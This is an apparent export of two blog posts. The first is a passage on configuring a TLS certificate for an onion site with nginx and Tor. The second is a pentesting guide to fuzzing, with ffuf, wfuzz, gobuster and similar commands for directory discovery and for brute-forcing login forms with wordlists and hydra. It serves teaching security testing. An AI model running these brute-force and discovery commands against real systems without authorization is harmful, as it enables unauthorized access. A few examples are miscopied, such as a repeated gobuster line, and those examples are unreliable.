        "content": "\nI had completely forgotten about this topic. I remembered that I was interested in it in the past, but when the topic of TLS certificates for onion domains came up, it was only available from DigiCert and that was not a financially viable option for me. Ultimately, these are solutions more for business. Fortunately, Harica came along, which I wrote about here (check it for more details).\nIn general, you know you’re getting old when you go looking for information on a topic and find a post on your own site that was added three years ago. That’s what happened to me with the TLS topic for The Onion. You’ll never guess what the post was called… yes, that’s right, the title was “TLS certificate for onion site” and I found it by typing “onion cert harica” into Google, where the result with my site was somewhere in the middle of the first page of Google.\nSome time ago I got into the habit of looking at my site first and possibly updating the post before I started writing a new one, but I forget that sometimes xD. So let this post be a lesson to me and assume that the topic is so important and interesting that I will repeat it. This time with an example of how I implemented it on my site.\n\nIf you are also considering implementing onion cert on your website, make sure you configure hidden services correctly first, for example by reading “Add Onion domain to your website“. And here are details about Harica onion cert itself. It costs only 30 USD per year and if you buy it for a longer time you will get some discount.\nSome people might ask, but why? Why a cert for an already encrypted connection? Good answers have already been provided, just check out HTTPS for your Onion Service and HARICA announcement on Kiwifarms.\nOkay no more repeating the same information over and over again. It’s time to show you how I configured it.\nSetupFirst of all you need to register an account in Harica Cert Manager, buy a cert for a server and follow the instructions to verify your domain. As I am using Hexo Generator and I choose the option to verify by file, I had to create a specific folder on the server. In Hexo you can generate additional folders and content just by adding them to the source folder in Hexo and then include the folder in Hexo configuration file _config.yml, here is my example: include: .well-known/**/*. Thanks to this modification, the folder will be moved to the root folder of your site during website generation.\nOnce the domain has been confirmed by Harica and the certificate has been paid, you can configure your web server. My Nginx configuration has two site files, one for the standard domain 0ut3r.space and the other for onion domain. Both look pretty much the same, the only difference is the port number.\nFor the onion configuration I just had to add cert and force browsers to use https connection instead of http. Here is what I added in the server section.\n12listen 127.0.0.1:8080;listen 127.0.0.1:8443 ssl http2;\nAdded another lines for ssl:\n1234567891011121314#SSLssl_certificate /path/to/cert/cert.pem;ssl_certificate_key /path/to/cert/cert_key.pem;ssl_session_cache shared:le_nginx_SSL:10m;ssl_session_timeout 1440m;ssl_session_tickets off;ssl_protocols TLSv1.2 TLSv1.3;ssl_prefer_server_ciphers off;ssl_ciphers \"ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\";# Force httpsif ($scheme != \"https\") {return 301 https://$host$request_uri;}\nAs Harica allows you to download cert in different formats, just make sure that you downloaded PEM bundle (typical text format including the whole certificate chain together with the cross certificate). Your private cert will probably be encrypted with a password (you can generate and import your private key or generate one in Harica Cert Manager), but you don’t want to type it every time you restart your web server, so remove the password from it using the command:\n1openssl rsa -in your_private_key.pem -out new_private_key.pem\nAfter running this command, you’ll be prompted to enter the password for the current private key. Once you enter the correct password, OpenSSL will generate a new private key file (new_private_key.pem) without a password.\nDon’t forget to change your Tor configuration in /etc/tor/torrc accordingly:\n1234HiddenServiceDir /var/lib/tor/yourwebsite/HiddenServiceVersion 3HiddenServicePort 80 127.0.0.1:8080HiddenServicePort 443 127.0.0.1:8443\nAnd make sure your firewall is not blocking those ports :D\nThat’s it. I am happy that I finally implemented TLS for my onion domain, which I wanted to do for a long time (but forgot), and that my visitors feel safer now. Because you feel safer now, right? At least you can always check that the Onion site you are on matches the certificate, so you know you are on the one you want to be on and not one of the clones. As TBH, I bought and configured it just for my own weird amusement.\n"
    },
    {
        "title": "Fuzz the world",
        "posted_at": "2024-01-20",
        "category": "guides",
        "author": "hoek",
        "content": "\nAt the beginning of my pentesting journey, I was not quite sure what fuzzing was. Even though I used it all the time. \nBeing an amateur guitarist myself, fuzz to me was just a guitar effect that sounded like overdrive, but broken, like the amp had broken down and something was whining. As I didn’t have many colleagues, and still don’t, no one was able to explain to me in simple terms what fuzzing was. Nowadays, this is not a problem because you can type a phrase into Google and get thousands of answers and interpretations. But when I was studying in the days just after the extinction of the dinosaurs… in fact, when you start hacking, you pay little attention to the theory behind the tools and fire away at anything you can get your hands on. Hence the name Script Kiddie. But we all use scripts and automation! Yes, only experienced professionals know what they are doing. A script kiddie fires everything, without knowledge, without consistency, without thinking :)\n\nBut to come to the point, fuzzing is nothing more than enumeration. In fact, I would call it blind enumeration. Sending everything, possible or impossible, expected or not, to the system or application and analysing the results. That’s my definition, but let’s check the official one.\n\nIn programming and software development, fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Typically, fuzzers are used to test programs that take structured inputs. This structure is specified, e.g., in a file format or protocol and distinguishes valid from invalid input. An effective fuzzer generates semi-valid inputs that are “valid enough” in that they are not directly rejected by the parser, but do create unexpected behaviors deeper in the program and are “invalid enough” to expose corner cases that have not been properly dealt with.\n– Wikipedia\n\nIn penetration testing, it’s the same thing, automatically sending various types of random input to the program and recording unwanted events such as crashes, memory leaks or unauthorised access.\nIf you think you have never done any fuzzing then you are wrong, there are many types of fuzzing activities that you have probably already done using various tools e.g. when testing web application and checking how it reacts to string input in available fields looking for XSS, information disclosure in errors or SQLI, entered folder names in URLs looking for interesting locations with configuration, wrong permissions, looking for admin panel or backups (directory fuzzing), analysing network communication (protocol fuzzing) also known as network fuzzing, focuses on testing the robustness of network protocols. It involves sending malformed or unexpected data to network protocols to identify weaknesses and vulnerabilities in the communication channels. File format fuzzing is specific to applications that handle different file formats, such as document readers, image processors or media players. The aim is to identify weaknesses in the way these applications handle different file formats. API fuzzing involves testing the inputs and outputs of APIs for vulnerabilities. This can help identify security problems in the way APIs handle unexpected or malicious input. Brute force is also known as password fuzzing.\nLet him be the first to cast a stone who has not used intruder in a Burp, any Dir Buster tool, Hydra or SQLMap.\nThere are several types of fuzzing:\nRandom fuzzing - this is the simplest form of fuzzing, where random data is generated and fed as input to the target application. It aims to find vulnerabilities by introducing unexpected and arbitrary input.\nMutation-based fuzzing - involves taking existing valid input and making random changes to create new test cases. This method is more targeted than random fuzzing and can sometimes be more effective at finding vulnerabilities.\nGeneration-based fuzzing - test cases are generated based on knowledge of the input format or protocol used by the target application. This approach involves creating inputs that are likely to trigger specific code paths or edge cases within the software.\nSmart fuzzing - involves the use of more intelligent techniques, such as feedback-driven fuzzing or machine learning, to guide the fuzzing process. This can help to priorities and generate test cases that are more likely to uncover critical vulnerabilities.\nDepending on the target, type of activity and method of fuzzing, you will use different lists as input. These can be password dictionaries built from words on the page using CeWL or information about the person you have using Cupp or password lists from SecLists. For directory scanning you can use Seclist related to web content and hundreds dedicated for fuzzing SecLists. Another good, but no longer updated source of lists is fuzzdb.\nHere are some simple fuzzing steps you can follow:\n\nIdentify the target system\nIdentify inputs\nGenerate fuzzed data\nPerform tests on fuzzed data\nAnalyse system behaviour\nProblem logging\n\nNow that you know what fuzzing is and how it works, it’s time to look at some tools by way of example. There are two categories of fuzzing tools, those used for fuzzing everything and others known as directory/file fuzzing tools. I haven’t listed outdated, no longer developed tools like dirb, DirBuster and others because the ones that are actively developed are much more useful and have the same and even better functionality than the old ones, exception is made only for wfuzz.\nfuffA fast web fuzzer written in Go aka Fuzz Fast You Fool. The most powerful fuzzing tool. \nUsage examplesDirectory discovery\n1ffuf -w /path/to/wordlist -u https://target/FUZZ\nVirtual host discovery\n1ffuf -w /path/to/vhost/wordlist -u https://target -H \"Host: FUZZ\" -fs 4242\nGET parameter fuzzing\n1ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242\nThis also assumes a response size of 4242 bytes for invalid GET parameter name.\nFor wrong parameter in return filtring out 401 response:\n1ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ -fc 401\nPOST data fuzzing\n1ffuf -w /path/to/postdata.txt -X POST -d \"username=admin\\&password=FUZZ\" -u https://target/login.php -fc 401\nCheck more at: https://github.com/ffuf/ffuf\nwfuzzWfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload. Tools is not developed anymore but works good.\nMore details: https://github.com/xmendez/wfuzz\nUsage examplesDirectory discovery\n1wfuzz -w wordlist/general/common.txt --hc 404 http://testphp.vulnweb.com/FUZZ\nFuzzing parameter\n1wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ\nPOST data fuzzing\n1wfuzz -z file,wordlist/others/common_pass.txt -d \"uname=FUZZ&pass=FUZZ\"  --hc 302 http://testphp.vulnweb.com/userinfo.php\nCookies\n1wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ\nor\n1wfuzz -z file,wordlist/general/common.txt -b cookie=FUZZ http://testphp.vulnweb.com/\nHeaders:\n1wfuzz -z file,wordlist/general/common.txt -H \"myheader: headervalue\" -H \"myheader2: headervalue2\" http://testphp.vulnweb.com/FUZZ\nor\n1wfuzz -z file,wordlist/general/common.txt -H \"User-Agent: FUZZ\" http://testphp.vulnweb.com/\nMore usage samples: https://wfuzz.readthedocs.io/en/latest/user/basicusage.html\nMy exampleAnd here is my example using Crunch and CeWL in combination with wfuzz and a login form attack using parameter fuzzing that I did in the past.\nExamples of creating password/user lists:\n12345crunch 3 3 0123456789ABCDEF -o passwords.txtorcewl -d 2 -m 5 -w passwords.txt http://target.com --with-numbersorcewl -d 0 -m 5 -w usernames.txt http://target.com/team.php --lowercase\nand bruteforce using parameter fuzzing:\n1wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs \"Please enter the correct credentials\" -u http://target.com/login.php -d \"username=FUZZ&password=FUZ2Z\"\n-z file,usernames.txt loads the usernames list.-z file,passwords.txt uses the password list generated by CeWL.--hs \"Please enter the correct credentials\" hides responses containing the string “Please enter the correct credentials”, which is the message displayed for wrong login attempts.-u specifies the target URL.-d \"username=FUZZ&password=FUZ2Z\" provides the POST data format where FUZZ will be replaced by usernames and FUZ2Z by passwords.\nOf course you can do the same using thc-hydra:\n1hydra -L passwords.txt -P 3digits.txt -f -v http://target.com/ http-post-form \"/login.php:pin=^PASS^:Access denied\" -s 8000\nbut I just wanted to show you that a brute force login form can also be achieved by fuzzing parameters.\nferoxbusterA fast, simple, recursive content discovery tool written in Rust.\nMore details: https://github.com/epi052/feroxbuster\nUsage examplesFile extension fuzzing\n1./feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx\nThe command above adds .pdf, .js, .html, .php, .txt, .json, and .docx to each url.\nDocumentation: https://epi052.github.io/feroxbuster-docs/docs/\ndirsearchSimple web path scanner.\nMore details: https://github.com/maurosoria/dirsearch\nUsage examplesSimple search\n1python3 dirsearch.py -u https://target\n1python3 dirsearch.py -e php,html,js -u https://target\n1python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist\ngobusterDirectory/File, DNS and VHost busting tool written in Go\nMore details: https://github.com/OJ/gobuster\nUsage examplesDNS fuzzing\n1gobuster dns -d mysite.com -t 50 -w common-names.txt\nDirectory\n1gobuster dir -u https://mysite.com/path/to/folder -c 'session=123456' -t 50 -w common-files.txt -x .php,.html\nVhost\n1gobuster vhost -u https://mysite.com -w common-vhosts.txt\nParameters\n1gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt\nAWS bucket\n1gobuster vhost -u https://mysite.com -w common-vhosts.txt\nFuzzing listsFinally, interesting lists for the above tools. Each tool has it own lists, but it is worth to check other too.\n\nSecList\nfuzzdb\nCombined-Wordlists\nCommon Web Managers Fuzz Wordlists\n\nEnjoy fuzzing!\n"
    }
]